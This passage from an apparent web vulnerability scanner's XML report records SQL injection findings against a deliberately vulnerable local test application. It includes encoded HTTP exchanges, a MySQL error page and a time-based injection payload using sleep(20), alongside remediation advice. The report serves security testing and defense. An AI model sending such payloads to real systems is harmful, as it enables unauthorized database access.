XJjaC1MaXN0aW5nRGF0YWJhc2VUYWJsZUNvbHVtbnMtVW5pb25FeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCcn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjAxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogTGlzdGluZyBjb2x1bW5zIG9mIHRhYmxlcyAndXNlcnMnPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlQ29sdW1ucy1VbmlvbkV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtVW5pb25FeHBsb2l0L0Nhc2UwNS1JbmplY3Rpb25JblNlYXJjaC1MaXN0aW5nRGF0YWJhc2VUYWJsZUNvbHVtbnMtVW5pb25FeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjIxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogTGlzdGluZyBjb2x1bW5zIG9mIHRhYmxlcyAndXNlcnMnPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>9013362823290637312</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case06-InjectionInSearch-ListingDatabaseTableRecords-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case06-InjectionInSearch-ListingDatabaseTableRecords-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA2LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlUmVjb3Jkcy1VbmlvbkV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtVW5pb25FeHBsb2l0L0Nhc2UwNi1JbmplY3Rpb25JblNlYXJjaC1MaXN0aW5nRGF0YWJhc2VUYWJsZVJlY29yZHMtVW5pb25FeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMzowOCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA2LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlUmVjb3Jkcy1VbmlvbkV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtVW5pb25FeHBsb2l0L0Nhc2UwNi1JbmplY3Rpb25JblNlYXJjaC1MaXN0aW5nRGF0YWJhc2VUYWJsZVJlY29yZHMtVW5pb25FeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCcn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjA4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDYgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogTGlzdGluZyByZWNvcmRzIG9mIHRhYmxlcyAndXNlcnMnPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTA2LUluamVjdGlvbkluU2VhcmNoLUxpc3RpbmdEYXRhYmFzZVRhYmxlUmVjb3Jkcy1VbmlvbkV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtVW5pb25FeHBsb2l0L0Nhc2UwNi1JbmplY3Rpb25JblNlYXJjaC1MaXN0aW5nRGF0YWJhc2VUYWJsZVJlY29yZHMtVW5pb25FeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAzOjI4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTMNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDYgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogTGlzdGluZyByZWNvcmRzIG9mIHRhYmxlcyAndXNlcnMnPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2020568178666925056</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case07-InjectionInSearch-RetrieveCurrentUserDetails-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case07-InjectionInSearch-RetrieveCurrentUserDetails-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
